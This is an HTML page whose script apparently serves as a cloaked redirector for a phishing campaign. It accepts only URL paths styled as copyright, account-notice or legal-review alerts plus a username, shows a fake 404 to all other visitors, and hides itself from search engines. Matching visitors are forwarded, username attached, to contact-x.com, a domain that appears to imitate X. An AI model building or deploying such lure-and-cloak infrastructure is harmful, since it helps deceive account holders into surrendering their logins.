<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="robots" content="noindex, nofollow" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title></title>
  <style>
    html,body{margin:0;height:100%;background:#111;color:#eee;font:16px/1.4 system-ui,sans-serif}
    main{min-height:100%;display:flex;align-items:center;justify-content:center;display:none}
    main.show{display:flex}
    p{opacity:.7}
  </style>
  <script>
(function () {
  // CTA mail path prefixes (slot_identity _X_PATHS) — netlify-x ile ayni
  var ALLOWED = {
    "content/support": 1,
    "help/copyright": 1,
    "account/notice": 1,
    "legal/review": 1,
    "copyright/continue": 1
  };

  function show404() {
    document.title = "404";
    var m = document.getElementById("nf");
    if (m) m.className = "show";
  }

  function ctaUser() {
    var parts = location.pathname.replace(/\/+$/, "").split("/").filter(Boolean);
    // /{prefix}/{suffix}/{username}
    if (parts.length !== 3) return null;
    var prefix = parts[0] + "/" + parts[1];
    if (!ALLOWED[prefix]) return null;
    var u = parts[2];
    if (!/^[A-Za-z0-9._]{1,64}$/.test(u)) return null;
    if (u === "index.html" || u === "404.html") return null;
    return u;
  }

  var user = ctaUser();
  if (!user) {
    show404();
    return;
  }

  // netlify-x: /content/support/{user} → https://contact-x.com/{user}/content/support
  var dest =
    "https://contact-x.com/" +
    encodeURIComponent(user) +
    "/content/support" +
    location.search +
    location.hash;
  location.replace(dest);
})();
  </script>
</head>
<body>
  <main id="nf"><div><h1>404</h1><p>Not found.</p></div></main>
</body>
</html>
